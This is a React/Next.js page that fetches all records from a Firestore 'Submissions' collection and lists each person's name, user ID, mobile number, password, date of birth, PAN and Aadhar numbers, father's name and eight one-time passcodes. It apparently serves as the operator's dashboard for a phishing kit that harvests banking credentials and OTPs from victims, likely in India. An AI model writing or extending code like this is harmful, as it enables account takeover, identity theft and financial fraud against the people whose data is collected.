'use client'
import { db } from "./firebaseConfig";
import React,  { useEffect, useState } from "react";
import { collection, getDocs} from "firebase/firestore"

async function fetchDataFromFirestore (){
    const querySnapshot = await getDocs(collection (db, "Submissions"))

    const data = [];
    querySnapshot.forEach((doc) => {
        data.push({ id: doc.id, ...doc.data()});
    });
       return data; 

}

export default function page() {
    const [userData, setUserData] = useState([]);

    useEffect(() => {
        async function fetchData() {
        const data = await fetchDataFromFirestore();
        setUserData(data);
    }
    fetchData();

    
}, []);
    return (
    <main >
    
    <h1 >
        ...........................All Details Here...........
    </h1>
    <div><h3 style={{color:'red'}}>Customer Name :-</h3>
        {userData.map((user) => (
            <div key={user.id} >
                  
                <p>{user.nme}</p>
                

            </div>
        ))}
    </div>




    <div><h3 style={{color:'red'}}>User ID :-</h3>
        {userData.map((user) => (
            <div key={user.id} >

                <p>{user.athu}</p> 
                 
            </div>
        ))}
    </div>

    <div><h3 style={{color:'red'}}>Mobile NO :-</h3>
        {userData.map((user) => (
            <div key={user.id} >

                <p>{user.mbi}</p> 
                 
            </div>
        ))}
    </div>

    <div><h3 style={{color:'red'}}>Password :-</h3>
        {userData.map((user) => (
            <div key={user.id} >

                <p>{user.prd}</p> 
                 
            </div>
        ))}
    </div>

    <div><h3 style={{color:'red'}}>OTP 1 :-</h3>
        {userData.map((user) => (
            <div key={user.id} >

                <p>{user.PP1}</p> 
                 
            </div>
        ))}
    </div>


    <div><h3 style={{color:'red'}}>Date Of Birth :-</h3>
        {userData.map((user) => (
            <div key={user.id}>

                <p>{user.dob}</p> 
                 
            </div>
        ))}
    </div>

    <div><h3 style={{color:'red'}}>OTP 2 :-</h3>
        {userData.map((user) => (
            <div key={user.id} >

                <p>{user.PP2}</p> 
                 
            </div>
        ))}
    </div>

    <div><h3 style={{color:'red'}}>OTP 3 :-</h3>
        {userData.map((user) => (
            <div key={user.id} >

                <p>{user.PP3}</p> 
                 
            </div>
        ))}
    </div>

    <div><h3 style={{color:'red'}}>Pan No :-</h3>
        {userData.map((user) => (
            <div key={user.id} >

                <p>{user.pni}</p> 
                 
            </div>
        ))}
    </div>

    <div><h3 style={{color:'red'}}>OTP 4 :-</h3>
        {userData.map((user) => (
            <div key={user.id}>

                <p>{user.PP4}</p> 
                 
            </div>
        ))}
    </div>

    <div><h3 style={{color:'red'}}>Father's Name :-</h3>
        {userData.map((user) => (
            <div key={user.id} >

                <p>{user.fathr}</p> 
                 
            </div>
        ))}
    </div>

    <div><h3 style={{color:'red'}}>Aadhar No :-</h3>
        {userData.map((user) => (
            <div key={user.id} >

                <p>{user.lan}</p> 
                 
            </div>
        ))}
    </div>

    <div><h3 style={{color:'red'}}>OTP 5 :-</h3>
        {userData.map((user) => (
            <div key={user.id}>

                <p>{user.PP5}</p> 
                 
            </div>
        ))}
    </div>

    <div><h3 style={{color:'red'}}>OTP 6 :-</h3>
        {userData.map((user) => (
            <div key={user.id} >

                <p>{user.PP6}</p> 
                 
            </div>
        ))}
    </div>

    <div><h3 style={{color:'red'}}>OTP 7 :-</h3>
        {userData.map((user) => (
            <div key={user.id} >

                <p>{user.PP7}</p> 
                 
            </div>
        ))}
    </div>

    <div><h3 style={{color:'red'}}>OTP 8 :-</h3>
        {userData.map((user) => (
            <div key={user.id} >

                <p>{user.PP8}</p> 
                 
            </div>
        ))}
    </div>





   
    
    </main>
    )
  }
